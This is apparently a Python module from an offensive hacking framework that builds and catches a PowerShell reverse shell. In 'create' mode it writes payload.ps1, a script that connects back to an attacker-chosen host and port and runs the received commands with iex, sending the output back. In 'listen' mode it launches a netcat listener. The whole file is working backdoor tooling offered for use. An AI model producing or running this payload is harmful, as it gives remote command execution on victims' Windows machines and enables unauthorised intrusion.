import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_ps_reverse_tcp",
        "title"       : "Payload powershell",
        "module"      : "payloads/nc/ps/reverse_tcp powershell windows",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.ps1"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.ltype == "CREATE" or var.ltype[0] == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark  = '"'
            mark2 = ','
            f = open(var.lname[0] , 'w')
            payload = '''
$client = New-Object System.Net.Sockets.TCPClient( '''+mark+var.lhost[0]+mark+mark2+var.lport[0]+''' );$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

'''
            f.write(payload)
            f.close()

        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
            os.system("nc -l -p "+str(var.lport[0])+" -v")


        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
